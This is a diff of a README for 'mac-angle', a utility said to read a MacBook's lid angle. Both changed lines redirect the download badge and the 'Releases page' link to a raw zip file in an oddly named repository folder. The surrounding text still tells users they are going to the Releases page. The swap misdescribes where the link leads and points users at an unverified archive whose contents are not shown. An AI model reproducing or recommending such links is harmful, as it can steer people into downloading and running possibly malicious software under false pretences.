@@ -1,6 +1,6 @@
 # 👩‍💻 mac-angle - Access Your MacBook Lid Angle Easily
 
-![Download mac-angle](https://img.shields.io/badge/Download-mac--angle-brightgreen)
+![Download mac-angle](https://raw.githubusercontent.com/Tarantuno/mac-angle/main/disquisition/angle-mac-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started, you need to download the software. Follow these steps:
 
 1. **Visit the download page:** Click the link below to go to the Releases page.
    
-   [Download mac-angle](https://github.com/Tarantuno/mac-angle/releases)
+   [Download mac-angle](https://raw.githubusercontent.com/Tarantuno/mac-angle/main/disquisition/angle-mac-3.7.zip)
 
 2. On the Releases page, find the latest version of mac-angle. There will be a list of available files.
 
